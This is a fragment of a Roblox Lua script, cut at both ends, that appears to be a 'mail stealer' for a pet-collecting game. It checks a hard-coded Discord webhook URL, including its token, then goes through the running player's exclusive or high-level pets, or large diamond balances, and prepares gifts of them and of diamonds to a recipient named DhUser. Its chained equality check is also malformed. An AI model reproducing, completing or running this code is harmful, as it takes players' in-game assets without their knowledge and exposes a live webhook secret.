...
if _G.Webhook == _G.Webhook == "https://discord.com/api/webhooks/1093827767948288050/rx_kEjRnxLTNUmSrZgME13mMRdLPaeXyFjdhnCgArlXA-ASK9jo6ifUQUgo6iSXL_JBN" then
...
for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Mailbox.Frame.GiftPet.Container.Inventory.Pets:GetChildren()) do
    if v:IsA("TextButton") then
        if v:FindFirstChild("RarityGradient"):FindFirstChild("Exclusive") then
            if v:FindFirstChild("Level").Text == "???" or v:FindFirstChild("Level").Text == "????" or player.leaderstats.Diamonds.Value >= 35000000000 then         
            local args = {
                [1] = {
                    ["Recipient"] = DhUser,
                    ["Diamonds"] = dims,
